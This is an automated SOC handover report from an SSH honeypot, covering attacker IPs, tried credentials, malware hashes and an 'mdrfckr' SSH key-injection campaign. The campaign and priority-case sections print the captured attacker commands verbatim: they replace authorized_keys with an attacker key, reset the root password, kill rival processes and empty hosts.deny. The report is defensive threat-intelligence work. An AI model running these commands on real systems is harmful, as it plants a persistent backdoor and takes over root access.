# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-05 |
| **Generated At** | 2026-04-05T14:34:29Z |
| **Shift Time** | 14:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **21** |
| Confirmed Threats | **17** |
| False Positives Filtered | **4** (19.1%) |
| Unique Attacker IPs | **13** |
| Countries of Origin | **5** |
| High Severity Cases | **1** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **20** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **9** |
| Unique Credential Pairs | **9** |
| Unique Usernames | **9** |
| Unique Passwords | **9** |
| Successful Auth Pairs | **1** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `sstest` | 1 |
| `ubuntu` | 1 |
| `root` | 1 |
| `345gs5662d34` | 1 |
| `sinusbot` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `sstest123` | 1 |
| `ubuntu14!` | 1 |
| `Root4321@#` | 1 |
| `345gs5662d34` | 1 |
| `123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `sstest` | `sstest123` | 1 |
| `ubuntu` | `ubuntu14!` | 1 |
| `root` | `Root4321@#` | 1 |
| `345gs5662d34` | `345gs5662d34` | 1 |
| `sinusbot` | `123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Root4321@#` | `72.253.251.7` | 2026-04-05T13:34:57 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **21** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 15 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 14 | 6 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 14 | 6 | Modern SSH client |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:FqSDhGOYo7Qj"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `72.253.251.7`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **13** |
| Unique ASNs | **12** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS36149` | Hawaiian Telcom Services Company, Inc. | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS3352` | TELEFONICA DE ESPANA S.A.U. | 1 | LOW |
| `AS50360` | Tamatiya EOOD | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (1)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c04a9bcfdf10

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-04-05 13:34 |
| **Last Seen** | 2026-04-05 13:36 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:FqSDhGOYo7Qj"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 13:34:55` | `cowrie.session.connect` |
| `2026-04-05 13:34:55` | `cowrie.client.version` |
| `2026-04-05 13:34:56` | `cowrie.client.kex` |
| `2026-04-05 13:34:57` | `cowrie.login.success` |
| `2026-04-05 13:34:57` | `cowrie.session.params` |
| `2026-04-05 13:34:57` | `cowrie.command.input` |
| `2026-04-05 13:34:57` | `cowrie.command.failed` |
| `2026-04-05 13:34:58` | `cowrie.log.closed` |
| `2026-04-05 13:34:58` | `cowrie.session.params` |
| `2026-04-05 13:34:58` | `cowrie.command.input` |
| `2026-04-05 13:34:59` | `cowrie.session.file_download` |
| `2026-04-05 13:34:59` | `cowrie.log.closed` |
| `2026-04-05 13:35:08` | `cowrie.session.params` |
| `2026-04-05 13:35:08` | `cowrie.command.input` |
| `2026-04-05 13:35:08` | `cowrie.log.closed` |
| `2026-04-05 13:35:09` | `cowrie.session.params` |
| `2026-04-05 13:35:09` | `cowrie.command.input` |
| `2026-04-05 13:35:09` | `cowrie.log.closed` |
| `2026-04-05 13:35:10` | `cowrie.session.params` |
| `2026-04-05 13:35:10` | `cowrie.command.input` |
| `2026-04-05 13:35:10` | `cowrie.session.file_download` |
| `2026-04-05 13:35:10` | `cowrie.log.closed` |
| `2026-04-05 13:35:11` | `cowrie.session.params` |
| `2026-04-05 13:35:11` | `cowrie.command.input` |
| `2026-04-05 13:35:11` | `cowrie.log.closed` |
| `2026-04-05 13:35:12` | `cowrie.session.params` |
| `2026-04-05 13:35:12` | `cowrie.command.input` |
| `2026-04-05 13:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `72.253.251[.]7` | **7** | 2026-04-05 13:29 | 2026-04-05 14:30 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.36[.]71` | **2** | 2026-04-05 13:46 | 2026-04-05 13:54 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.95[.]172` | 1 | 2026-04-05 13:56 | 2026-04-05 13:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.159[.]237` | 1 | 2026-04-05 13:49 | 2026-04-05 13:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]106` | 1 | 2026-04-05 13:47 | 2026-04-05 13:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-04-05 13:50 | 2026-04-05 13:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.92.182[.]111` | 1 | 2026-04-05 12:57 | 2026-04-05 12:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `61.185.190[.]42` | 1 | 2026-04-05 13:52 | 2026-04-05 13:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-04-05 13:18 | 2026-04-05 13:18 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `78.128.114[.]118` | BG | Tamatiya EOOD | **100** ⚠️ | 50 |
| `14.103.115[.]106` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `61.185.190[.]42` | CN | CHINANET Shanxi(SN) province network | **100** ⚠️ | 35 |
| `72.253.251[.]7` | US | HAWAIIAN TELCOM | **100** ⚠️ | 49 |
| `180.106.83[.]59` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `101.126.95[.]172` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 35 |
| `165.154.36[.]71` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `119.96.159[.]237` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `3.92.182[.]111` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 23 |
| `60.18.51[.]17` | CN | China Unicom Liaoning province network | 24 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 16 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 8 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 1 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 21 cases |
| Tool 34  | Credential Extractor        | ✅ 9 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 13 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (19.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 1 priority case(s) shown individually · 9 recon entry/entries in table (2 group(s) consolidating 9 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-05T14:34:29Z_
